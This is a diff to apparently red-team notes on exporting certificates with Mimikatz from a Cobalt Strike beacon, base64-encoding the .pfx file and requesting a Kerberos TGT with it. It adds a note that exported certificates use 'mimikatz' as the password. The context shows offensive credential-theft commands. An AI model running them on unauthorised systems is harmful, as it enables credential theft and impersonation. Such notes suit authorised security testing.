@@ -83,6 +83,8 @@ beacon> mimikatz crypto::certificates /export
 beacon> mimikatz !crypto::certificates /systemstore:local_machine /export
 ```
 
+> **NOTE**: Mimikatz always export certificates with `mimikatz` as password.
+
 Download the file and sync files from cobalt strike to your local machine.
 
 ```
@@ -97,6 +99,7 @@ Encode in base64 the `.pfx` file.
 cat CURRENT_USER_My_0_User\ Example.pfx | base64 -w0
 ```
 And finally use it to request a TGT.
+
 
 # Security Account Manager
 
